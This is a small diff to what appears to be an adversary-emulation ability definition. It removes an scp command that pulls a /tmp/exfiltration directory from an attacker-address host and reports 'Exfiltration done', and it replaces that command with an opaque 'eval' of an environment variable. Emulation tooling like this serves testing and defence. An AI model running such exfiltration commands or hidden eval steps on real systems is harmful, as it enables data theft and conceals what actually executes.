@@ -6,4 +6,4 @@
   repeatable: false
   singleton: true
   platforms:
-    linux: { sh: { command: 'sleep $W408 && scp -r -P 4222 root@$(cat $DATA_PATH/KC4/attackaddr):/tmp/exfiltration $DATA_PATH/KC4/analysis && echo "Exfiltration done"', timeout: 900, parsers: [], cleanup: "" } }
+    linux: { sh: { command: "eval $KC0408", timeout: 900, parsers: [], cleanup: "" } }
